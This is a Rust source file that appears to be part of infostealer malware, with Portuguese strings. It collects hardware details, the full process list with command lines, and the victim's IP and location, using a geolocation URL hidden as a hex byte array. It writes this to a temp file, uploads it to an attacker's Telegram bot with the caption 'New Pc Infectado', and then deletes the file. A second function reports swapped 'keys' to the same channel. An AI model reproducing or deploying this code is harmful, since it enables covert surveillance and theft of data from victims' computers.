// find information  pc

use std::{
    env::temp_dir,
    error::Error,
    fs::{self, File, OpenOptions},
    io::Write,
    path::PathBuf,
};

/*
-- find process
-- find users
-- find ip
-- find hardware information

*/
use serde_json::Value;

trait HumanBytes {
    fn get_human_bytes(&self) -> String;
}

impl HumanBytes for u64 {
    fn get_human_bytes(&self) -> String {
        human_bytes::human_bytes(*self as f64)
    }
}

pub mod information {
    use std::{
        ffi::{OsStr, OsString},
       
    };

    use sysinfo::*;

    use super::HumanBytes;

    pub fn hardware_system() -> String {
        let sys = sysinfo::System::new_all();
        let total_memory = sys.total_memory().get_human_bytes();
        let total_used_memory = sys.total_memory().get_human_bytes();
        let total_memory_swap = sys.total_swap().get_human_bytes();
        let total_used_swap = sys.used_swap().get_human_bytes();
        let count_number_cpu = sys.cpus().len();

        format!("total memoria ram: {total_memory}\ntotal memoria usada no momento: \n{total_used_memory}
        \ntotal memoria swap(Memoria Virtual): {total_memory_swap}\nmemoria swap usada: {total_used_swap}\ntotal cpu: {count_number_cpu}
        ")
    }
    pub fn process() -> String {
        let mut sys_ = String::new();
        let sys = sysinfo::System::new_all();
        let processes = sys.processes();
    
        for (pid, process) in processes {
            let pid = pid.as_u32();
            let cmd = process.cmd().join(" ");
            let read_bytes = process.disk_usage().total_read_bytes.get_human_bytes();
            let write_bytes = process.disk_usage().total_written_bytes.get_human_bytes();
            let memory_used = process.memory().get_human_bytes();
            let name = process.name(); // já é &str
    
            let format_print = format!(
                "\n🦠 Pid: {pid}\n\t┣━ Command Line: {cmd}\n\t┣━ Name: {name}\n\t┣━ Total Read Bytes: {read_bytes}\n\t┣━ Total Write Bytes: {write_bytes}\n\t┣━ Total Memory Usage: {memory_used}"
            );
    
            sys_.push_str(&format_print);
        }
    
        sys_
    }    
    /* 
    pub fn get_users() -> String {
        use users::os::unix::UserExt;
        let realname = whoami::realname();
        let devicename = whoami::devicename();
        let hostname = whoami::hostname();
        let desktop_env = whoami::desktop_env().to_string();
        let device_os = whoami::devicename_os().to_string_lossy().to_string();
        let distro = whoami::distro();
        let platform = whoami::platform().to_string();
        let username = whoami::username();
        unsafe {
            let users: Vec<users::User> = users::all_users().collect();
            let mut users_string = String::new();

            for user in users {
                let name = user.name().to_string_lossy().to_string();
                let group_user = user.groups();

                if let Some(group) = group_user {
                    let mut push_user = format!("┣━ User: {}\n\tGroup:", name);
                    for group in group {
                        let name = group.name().to_string_lossy().to_string();
                        let id = group.gid();
                        push_user.push_str(&format!("\n\t\t┣━ Name: {name}\n\t\t┣━ Id: {id}\n\n"));
                    }
                    users_string.push_str(&push_user);
                }
            }
            format!("RealName: {realname}\nDeviceName: {devicename}\nHostName: {hostname}\nDesktopEnv: {desktop_env}\nDeviceOs: {device_os}\nDistro: {distro}\nPlatform: {platform}\nUsername: {username}\n\nUsers: {users_string}")
        }
    }

    */
}

const api_url_json_geolocation: [u8; 23] = [
    0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f, 0x69, 0x70, 0x2d, 0x61, 0x70, 0x69, 0x2e, 0x63, 0x6f,
    0x6d, 0x2f, 0x6a, 0x73, 0x6f, 0x6e, 0x2f,
];

#[derive(Debug)]
pub struct geolocation {
    pub contry_pais: String,
    pub Region_name: String,
    pub city_cidade: String,
    pub ips_or_org: String,
    pub target_ip: String,
}
use reqwest::blocking::get;
pub fn default_geolocation() -> geolocation {
    let bytes_not_found: [u8; 9] = [0x4e, 0x6f, 0x74, 0x20, 0x66, 0x6f, 0x75, 0x6e, 0x64];
    let convert_borrow = String::from_utf8(bytes_not_found.to_vec()).unwrap();
    let error = convert_borrow.as_str();
    let api_get: String = String::from_utf8(api_url_json_geolocation.to_vec()).unwrap();
    let requets_from_json: Value =
        serde_json::from_str(get(&api_get).unwrap().text().unwrap().as_str()).unwrap();
    let contry_pais = requets_from_json
        .get("country")
        .unwrap()
        .as_str()
        .unwrap_or(error)
        .to_string();
    let Region_name = requets_from_json
        .get("regionName")
        .unwrap()
        .as_str()
        .unwrap_or(error)
        .to_string();
    let city_cidade = requets_from_json
        .get("city")
        .unwrap()
        .as_str()
        .unwrap_or(error)
        .to_string();
    let ips_or_org = requets_from_json
        .get("org")
        .unwrap()
        .as_str()
        .unwrap_or(error)
        .to_string();
    let target_ip = requets_from_json
        .get("query")
        .unwrap()
        .as_str()
        .unwrap_or(error)
        .to_string();

    geolocation {
        contry_pais,
        city_cidade,
        Region_name,
        ips_or_org,
        target_ip,
    }
}



use reqwest::blocking::multipart::Form;
pub fn send_message_text(key: &str , replace: &str,id: &str ,token: &str){
    let url = format!("https://api.telegram.org/bot{token}/sendMessage?chat_id={id}&text=FIz o replace dessa chave: ```{key}```\nChave trocada: ```{replace}```");

    reqwest::blocking::get(url);
}
pub fn send_message_telegram(token: &str, id: &str) -> Result<(), Box<dyn Error>> {
    let file_ = temp_dir().join("information.txt");
    let get = default_geolocation();
    let legend = format!("**New Pc Infectado kkkkkkkk\n\n IP: ```{}```\nPais: ```{}```\nCidade: ```{}```\nProvedor: ```{}```\n\n",get.target_ip,get.contry_pais,get.city_cidade, get.ips_or_org);

    let mut String_file = format!(
        "**New Pc Infectado kkkkkkkk\n\n IP: {}\nPais: {}\nCidade: {} \nProvedor: {}\n\n",
        get.target_ip, get.contry_pais, get.city_cidade, get.ips_or_org
    );

    String_file.push_str(&information_all());

    let mut file = OpenOptions::new()
        .append(true)
        .create(true)
        .write(true)
        .open(&file_)?;
    _ = file.write(String_file.as_bytes());

    let kkk = std::fs::File::open(&file_)?;
    let part = reqwest::blocking::multipart::Part::reader(kkk)
        .file_name("information.txt")
        .mime_str("text/plain")?;
    let form = Form::new()
        .text("chat_id", id.to_string())
        .text("caption", legend)
        .part("document", part)
        .text("parse_mode", "Markdown");

    let url = format!("https://api.telegram.org/bot{}/sendDocument", token);

    let client = reqwest::blocking::Client::new();
    let res = client.post(&url).multipart(form).send()?;

    _ = std::fs::remove_file(file_);
    Ok(())
}

fn information_all() -> String {
    format!(
        "---- Host ----\n\n{}----- Processos ----\n\n\n{}",
        information::hardware_system(),
        
        information::process()
    )
}
